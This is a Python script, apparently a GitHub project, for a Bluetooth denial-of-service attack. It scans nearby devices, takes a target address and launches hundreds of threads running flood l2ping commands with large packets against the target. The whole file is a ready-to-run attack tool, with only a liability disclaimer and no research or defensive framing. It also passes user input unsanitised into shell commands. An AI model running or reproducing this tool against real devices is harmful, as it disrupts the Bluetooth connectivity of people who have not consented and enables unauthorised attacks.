from os import system
from time import sleep
from threading import Thread


def scan_devices():
    system("sudo hcitool scan")


def setup_interface():
    system("sudo rfkill unblock bluetooth")
    system("sudo hciconfig -a hci0 up")


def attack(pack_size, target_addr):
    system(f"sudo l2ping -i hci0 -s {pack_size} -f {target_addr}")


def banner():
    print("{:.^71}".format("\x1b[37;4mhttps://github.com/DiegoBloise\x1b[0m"))
    print("\x1b[37;36m")
    print("""
    *****       *****            ***                       
     *   *       *   *          *   *                      
     *   *       *   *          *                          
     *   *       *   *          *       ****    ****       
     *   *       ****            ***   *    *  *    *      
     *   *       *   *              *  ******  *           
     *   *       *   *              *  *       *           
     *   * **    *   * **       *   *  *    *  *    *  **  
    *****  **   *****  **        ***    ****    ****   **
    """)
    print("\x1b[0m")
    print("{:.^60}".format("Bluetooth DOS Attack"))
    print("")


def main():
    banner()
    sleep(0.1)
    print()
    print("\x1b[31mTHIS SOFTWARE IS PROVIDED \"AS IS\" WITHOUT WARRANTY OF ANY KIND.\nYOU MAY USE THIS SOFTWARE AT YOUR OWN RISK.\nTHE USE IS COMPLETE RESPONSABILITY OF THE END-USER.\nTHE DEVELOPERS ASSUME NO LIABILITY AND ARE NOT RESPONSIBLE FOR\nANY MISUSE OR DAMAGE CAUSED BY THIS PROGRAM.\n")
    if (input("Do you agree? [y/n] ~> ") in ["Y", "y"]):
        sleep(0.1)
        system("clear")
        banner()
        print()
        
        print("[*] Turning on bluetooth interface...")
        setup_interface()
        sleep(3)
        
        system("clear")
        banner()
        print()
        
        print("{:>25}".format("[1] Scan nearby devices. "))
        print("{:>25}".format("[2] Entry device address."))
        choice = int(input("{:>25}".format("Select an option ~> ")))
        
        if choice == 2:
            target_addr = input("{:>25}".format("Target address ~> "))
        elif choice == 1:
            while True:
                system("clear")
                banner()
                print()
                scan_devices()
                print()
                print("{:>25}".format("Enter target address or:"))
                print("{:>25}".format("[1] Scan again."))
                print("{:>25}".format("[2] Exit.      "))
                target_addr = input("{:>25}".format("Option or address ~> "))
                if target_addr == "1":
                    continue
                elif target_addr == "2":
                    raise KeyboardInterrupt
                else:
                    break
        if len(target_addr) < 1:
            print("[!] ERROR: Target address is missing.")
            exit(0)
        
        system("clear")
        banner()
        print()

        print("{:>25}".format("[1] Default attack."))
        print("{:>25}".format("[2] Custom attack. "))
        print()

        try:
            choice = int(input("{:>25}".format("Select attack ~> ")))
            if choice not in range(1, 3):
                raise Exception
        except:
            print("[!] ERROR: Select a valid option.")
            exit(0)

        if choice == 2:
            try:
                pack_size = int(input("{:>25}".format("Packages size ~> ")))
            except:
                print("[!] ERROR: Packages size must be an integer.")
                exit(0)
    
            try:
                threads = int(input("{:>25}".format("Threads ~> ")))
            except:
                print("[!] ERROR: Threads must be an integer.")
                exit(0)
        elif choice == 1:
            pack_size = 600
            threads = 512


        print()
        system("clear")
        
        print(f"\x1b[31m[*] Starting DOS attack to {target_addr} in 3 seconds...")

        for i in range(0, 3):
            print(f"[*] {3 - i}")
            sleep(1)

        system("clear")
        print("[*] Building threads...\n")

        for i in range(0, threads):
            print(f"[*] Built thread Nº {i + 1}")
            Thread(target=attack, args=[pack_size, target_addr]).start()

        print("[*] Built all threads...")
        print("[*] Starting...")
    else:
        print("Finishing...")
        exit(0)


if __name__ == "__main__":
    try:
        system("clear")
        main()
    except KeyboardInterrupt:
        sleep(0.1)
        print("\n[*] Aborted by user.")
        exit(0)
    except Exception as error:
        sleep(0.1)
        print(f"[!] ERROR: {error}")

